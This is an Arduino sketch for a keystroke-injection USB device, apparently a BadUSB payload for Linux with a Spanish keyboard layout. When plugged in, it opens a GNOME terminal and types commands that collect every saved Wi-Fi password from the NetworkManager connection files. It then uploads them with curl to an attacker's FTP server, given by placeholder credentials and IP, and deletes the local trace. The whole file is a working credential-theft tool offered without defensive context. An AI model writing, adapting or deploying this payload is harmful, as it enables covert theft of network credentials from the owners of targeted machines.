
#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarGnome("gnome-terminal");
  delay(3000);
  Keyboard.println("cd /etc/NetworkManager/system-connections; grep psk= *|paste -sd,>~/capture.txt; cd ~; export xfile='capture.txt'; export ftpuser='USERNAME'; export ftppass='PASSWORD'; export xip='IPSERVERFTP'");
  delay(3000);
  Keyboard.println("curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}; rm capture.txt; exit");
  delay(5000);
  while(1);
}
